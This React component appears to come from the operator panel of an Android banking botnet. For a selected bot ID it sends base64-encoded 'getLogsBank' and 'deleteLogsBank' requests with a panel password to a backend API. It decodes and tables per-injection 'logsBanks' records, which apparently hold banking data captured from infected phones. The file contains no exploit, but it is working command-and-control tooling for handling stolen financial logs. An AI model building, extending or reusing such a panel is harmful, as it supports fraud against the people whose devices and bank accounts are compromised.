import React, { useState, useEffect, useMemo, useRef, useCallback } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, Switch, Tooltip, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";


import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faTrash, faTrashCan, faArrowsRotate } from '@fortawesome/free-solid-svg-icons';
import { CustomersTable } from '../logs-section/logs-table';
import { applyPagination } from '../../utils/apply-pagination';
import { useSelection } from '../../hooks/use-selection';


export default function Popup(props) {

    const useCustomerIds = (customers) => {
        return useMemo(
          () => {
            return customers.map((customer) => customer.id);
          },
          [customers]
        );
      };

    let data = [];
    const { idbot, customer, children, openPopup, setOpenPopup, onClose} = props;
    const countRef = useRef(0);
    const [page, setPage] = useState(0);
    const [rowsPerPage, setRowsPerPage] = useState(100);
    const [customers, setCustomers] = useState(applyPagination(data, page, rowsPerPage));
    const customersIds = useCustomerIds(customers);
    const customersSelection = useSelection(customersIds);
    
    const buttoncolor = "primary.main"

    const rootStyle = {
        display: 'flex',
        flexDirection: 'column',
        padding: '25px',
      };
    
      const smallBoxStyle = {
        marginBottom: '25px'
      };
    
      const tworoundstyle = {
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
      };
    


      useEffect(() => {
        checklogs()    
    
      }, []);

    const checklogs = async () => {
    let request = $.ajax({
        type: 'POST',
        url: SettingsContext.restApiUrl,
        data: {
            'params':  new Buffer ('{"request":"getLogsBank","tag":"test","idbot":"' + idbot + '","password":"' + SettingsContext.password + ' "}').toString('base64')
        }
    });

    request.done(function(msg) {
        let response = (JSON.parse(msg))
        let responsedata = response.logsBanks
        var data = [];

        responsedata.forEach((stats) => {
        const { idinj, idbot, application, comment, logs } = stats;
        var logsfinal = JSON.parse(atob(logs))
        
        data.push({  idinj, idbot, application, comment, logs: logsfinal});
        });

        setCustomers(applyPagination(data, SettingsContext.CurrentPageLogs, SettingsContext.RowsPerPageLogs))
        SettingsContext.CountLogs = data.length
        
        
    }.bind(this));
    
    };

    const handlePageChange = useCallback(
        (event, value) => {
          setPage(value);
          SettingsContext.CurrentPageLogs = value
          checklogs()
        },
        []
      );
    
    
    
      const handleRowsPerPageChange = useCallback(
        (event) => {
          setRowsPerPage(event.target.value);
          SettingsContext.RowsPerPageLogs = event.target.value
          checklogs()
        },
        []
      );

      const deletebots = async () => {
        let request = $.ajax({
          type: 'POST',
          url: SettingsContext.restApiUrl,
          data: {
             'params': new Buffer('{"request":"deleteLogsBank","idinj":"' + SettingsContext.SelectedBots.join(",") + '"}').toString('base64')
          }
        });
    
        request.done(function(msg) {
          checklogs()
        }.bind(this));
      }


    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth={false}>
            <DialogContent dividers >
                    <div style={{ display: "flex", justifyContent: "space-between"}}>
                    <Box
                    bgcolor={buttoncolor}
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={800}
                >
                    <SvgIcon fontSize="medium">
                          <UserIcon width={20} height={23}/> 
                        </SvgIcon>
                        <Typography ml={0.5}>{idbot}</Typography>
                        
                    </Box>
                    <Button
                    disabled={SettingsContext.user.role === "user"}
                      onClick={deletebots}
                      startIcon={(
                        <FontAwesomeIcon icon={faTrashCan} />
                      )}
                      variant="contained"
                    >
                      Delete Selected
                    </Button>

                    <Button
                      onClick={checklogs}
                      startIcon={(
                        <FontAwesomeIcon icon={faArrowsRotate} />
                      )}
                      variant="contained"
                    >
                      Reload
                    </Button>
                        
                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x" color={buttoncolor}/>
                    </Button>
                    </div>
                <Box width={1200}
                >
                    <br></br>
            <CustomersTable
                count={SettingsContext.CountLogs}
                items={customers}
                onDeselectAll={customersSelection.handleDeselectAll}
                onDeselectOne={customersSelection.handleDeselectOne}
                onPageChange={handlePageChange}
                onRowsPerPageChange={handleRowsPerPageChange}
                onSelectAll={customersSelection.handleSelectAll}
                onSelectOne={customersSelection.handleSelectOne}
                page={page}
                rowsPerPage={rowsPerPage}
                selected={customersSelection.selected}
            />
            </Box>
            </DialogContent>
        </Dialog>
    )
}
